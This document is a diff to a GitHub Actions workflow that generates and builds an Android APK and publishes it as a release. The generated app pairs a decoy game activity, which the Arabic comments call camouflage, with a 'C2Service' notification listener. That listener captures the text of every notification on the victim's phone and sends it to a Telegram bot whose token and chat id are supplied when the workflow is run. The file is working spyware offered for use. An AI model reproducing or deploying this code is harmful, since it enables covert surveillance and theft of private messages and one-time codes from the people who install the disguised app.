@@ -1,4 +1,4 @@
-name: Hussein V8 Final Stable
+name: Hussein V8 The Real Final
 on:
   workflow_dispatch:
     inputs:
@@ -12,50 +12,55 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: 1. تجهيز النظام
+      - name: 1. جلب الكود
         uses: actions/checkout@v4
-      - uses: actions/setup-java@v4
+        
+      - name: 2. إعداد لغة جافا
+        uses: actions/setup-java@v4
         with: { distribution: 'temurin', java-version: '17' }
 
-      - name: 2. إنشاء هيكل المشروع الصافي
+      # --- هذا هو الحل السحري للمشكلة ---
+      - name: 3. إجبار السيرفر على إصدار Gradle مستقر
+        uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: '8.4' 
+      # -----------------------------------
+
+      - name: 4. إنشاء ملفات المشروع الأساسية
         run: |
           mkdir -p app/src/main/java/com/hussein/v8
           mkdir -p app/src/main/res/values
 
-          # ملف الإعدادات
           echo "include ':app'" > settings.gradle
 
-          # ملف بناء المشروع الرئيسي (نسخة مستقرة جداً)
           cat << 'EOF' > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
-              dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
+              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
           }
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # ملف بناء التطبيق (بدون تعقيدات)
           cat << 'EOF' > app/build.gradle
           plugins { id 'com.android.application' }
           android {
               namespace 'com.hussein.v8'
-              compileSdk 33
+              compileSdk 34
               defaultConfig {
                   applicationId "com.hussein.v8"
                   minSdk 24
-                  targetSdk 33
+                  targetSdk 34
                   versionCode 1
                   versionName "1.0"
               }
           }
           dependencies {
-              implementation "com.squareup.okhttp3:okhttp:4.10.0"
+              implementation "com.squareup.okhttp3:okhttp:4.12.0"
           }
           EOF
 
-      - name: 3. حقن الأكواد (التوكن والأيدي)
+      - name: 5. حقن أكواد التمويه والتوكن
         run: |
-          # ملف الـ Manifest
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
@@ -74,7 +79,6 @@ jobs:
           </manifest>
           EOF
 
-          # كود سحب البيانات (C2Service)
           cat << 'EOF' > app/src/main/java/com/hussein/v8/C2Service.java
           package com.hussein.v8;
           import android.service.notification.NotificationListenerService;
@@ -87,7 +91,7 @@ jobs:
               public void onNotificationPosted(StatusBarNotification sbn) {
                   String token = "${{ github.event.inputs.bot_token }}";
                   String chatid = "${{ github.event.inputs.chat_id }}";
-                  String msg = "🎯 صيدة: " + sbn.getNotification().extras.getCharSequence("android.text");
+                  String msg = "🎯 صيدة جديدة من حسين!\n" + sbn.getNotification().extras.getCharSequence("android.text");
                   
                   OkHttpClient client = new OkHttpClient();
                   Request req = new Request.Builder()
@@ -101,7 +105,6 @@ jobs:
           }
           EOF
 
-          # كود اللعبة التمويهية
           cat << 'EOF' > app/src/main/java/com/hussein/v8/MainActivity.java
           package com.hussein.v8;
           import android.app.Activity;
@@ -118,14 +121,14 @@ jobs:
           }
           EOF
 
-      - name: 4. البناء النهائي (باستخدام Gradle النظام)
+      - name: 6. البناء النهائي للـ APK
         run: gradle assembleDebug
 
-      - name: 5. رفع ملف الـ APK
+      - name: 7. رفع رابط التحميل
         uses: softprops/action-gh-release@v1
         with:
-          tag_name: V8-Final-Stable-${{ github.run_number }}
-          name: تطبيق ${{ github.event.inputs.app_name }} جاهز
+          tag_name: V8-Halos-${{ github.run_number }}
+          name: تطبيق ${{ github.event.inputs.app_name }}
           files: app/build/outputs/apk/debug/*.apk
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
